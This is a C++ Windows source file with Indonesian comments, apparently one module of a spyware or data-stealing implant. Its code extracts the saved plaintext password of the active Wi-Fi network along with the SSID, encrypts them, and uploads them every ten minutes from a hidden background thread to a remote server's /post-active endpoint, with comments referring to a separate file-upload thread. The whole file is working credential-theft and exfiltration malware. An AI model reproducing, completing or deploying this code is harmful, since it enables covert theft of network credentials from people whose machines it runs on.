#include <winsock2.h>
#include "active.h"
#include "config.h"
#include "utils.h"
#include "transmission.h"
#include "encryption.h"
#include <wlanapi.h>
#include <sstream>
#include <mutex>
#include <thread>
#include <chrono>

#pragma comment(lib, "wlanapi.lib")

namespace ActiveMonitor {

    // State internal untuk melacak pengiriman terakhir
    static std::string lastSsid = ""; 
    static time_t lastSendTime = 0;   
    static std::mutex statusMtx;      // Melindungi variable lastSsid dan lastSendTime

    /**
     * Mengambil detail SSID dan Password WiFi yang sedang aktif.
     * Menggunakan pengecekan posisi XML yang aman untuk mencegah crash.
     */
    void GetWifiDetails(std::string& ssid, std::string& password) {
        HANDLE hClient = NULL;
        DWORD dwVersion = 0;
        if (WlanOpenHandle(2, NULL, &dwVersion, &hClient) != ERROR_SUCCESS) return;

        PWLAN_INTERFACE_INFO_LIST pIfList = NULL;
        if (WlanEnumInterfaces(hClient, NULL, &pIfList) == ERROR_SUCCESS) {
            for (int i = 0; i < (int)pIfList->dwNumberOfItems; i++) {
                PWLAN_CONNECTION_ATTRIBUTES pConnectInfo = NULL;
                DWORD connectInfoSize = sizeof(WLAN_CONNECTION_ATTRIBUTES);
                
                if (WlanQueryInterface(hClient, &pIfList->InterfaceInfo[i].InterfaceGuid, 
                    wlan_intf_opcode_current_connection, NULL, &connectInfoSize, (PVOID*)&pConnectInfo, NULL) == ERROR_SUCCESS) {
                    
                    DOT11_SSID rawSsid = pConnectInfo->wlanAssociationAttributes.dot11Ssid;
                    ssid = std::string((char*)rawSsid.ucSSID, rawSsid.uSSIDLength);
                    
                    PWSTR xmlProfile = NULL;
                    DWORD flags = WLAN_PROFILE_GET_PLAINTEXT_KEY;
                    if (WlanGetProfile(hClient, &pIfList->InterfaceInfo[i].InterfaceGuid, 
                        pConnectInfo->strProfileName, NULL, &xmlProfile, &flags, NULL) == ERROR_SUCCESS) {
                        
                        std::wstring xml(xmlProfile);
                        std::wstring startTag = L"<keyMaterial>";
                        std::wstring endTag = L"</keyMaterial>";
                        
                        size_t startPos = xml.find(startTag);
                        size_t endPos = xml.find(endTag);

                        // Validasi posisi: Pastikan tag ditemukan dan urutannya benar
                        if (startPos != std::wstring::npos && endPos != std::wstring::npos && endPos > startPos) {
                            startPos += startTag.length();
                            password = Ws2S(xml.substr(startPos, endPos - startPos));
                        }
                        WlanFreeMemory(xmlProfile);
                    }
                    WlanFreeMemory(pConnectInfo);
                }
            }
            WlanFreeMemory(pIfList);
        }
        WlanCloseHandle(hClient, NULL);
    }

    /**
     * Menyusun data heartbeat dan mengirimkannya ke endpoint /post-active.
     * Menggunakan parameter overrideUrl agar tidak bertabrakan dengan thread upload file.
     */
    void SendActiveStatus() {
        std::string baseUrl;
        
        // Ambil copy URL global saat ini
        if (Config::DYNAMIC_SERVER_URL.empty()) return;
        baseUrl = Config::DYNAMIC_SERVER_URL;

        std::string ssid = "Ethernet", pass = "N/A";
        GetWifiDetails(ssid, pass);
        
        time_t now = time(NULL);

        // Validasi interval (10 menit)
        {
            std::lock_guard<std::mutex> lock(statusMtx);
            if (lastSendTime != 0 && (now - lastSendTime < 590)) return; 
        }

        // 1. Siapkan konten log (SSID|Password)
        std::stringstream ss;
        ss << ssid << "|" << pass;
        std::string logContent = ss.str();
        std::vector<BYTE> data(logContent.begin(), logContent.end());
        
        // 2. Enkripsi data
        FinalEncryption(data);

        // 3. Susun Target URL secara lokal (Ubah .../upload menjadi .../post-active)
        size_t pos = baseUrl.find("/upload");
        if (pos != std::string::npos) baseUrl = baseUrl.substr(0, pos);
        if (!baseUrl.empty() && baseUrl.back() == '/') baseUrl.pop_back();

        std::string targetUrl = baseUrl + "/post-active";

        // 4. KIRIM DATA: Menggunakan parameter ke-7 (overrideUrl) 
        // Ini menjamin tidak ada perubahan pada Config::DYNAMIC_SERVER_URL secara global
        bool success = PostDataChunked(
            data,                       // chunk
            "activity",                 // type
            "active_status.dat",        // fname
            std::to_string(now),         // fileID
            0,                          // chunkNum
            1,                          // chunkTotal
            targetUrl                   // OVERRIDE URL (Inilah solusinya!)
        );

        if (success) {
            std::lock_guard<std::mutex> lock(statusMtx);
            lastSendTime = now;
            lastSsid = ssid;
        }
    }

    /**
     * Entry point untuk memulai monitoring di thread terpisah.
     */
    void StartReactiveMonitoring() {
        std::thread([]() {
            // Delay awal agar sistem utama (seperti RefreshDynamicLink) punya waktu bekerja
            std::this_thread::sleep_for(std::chrono::seconds(10)); 
            
            while (true) {
                SendActiveStatus();
                // Sleep 10 menit
                std::this_thread::sleep_for(std::chrono::seconds(600)); 
            }
        }).detach();
    }
}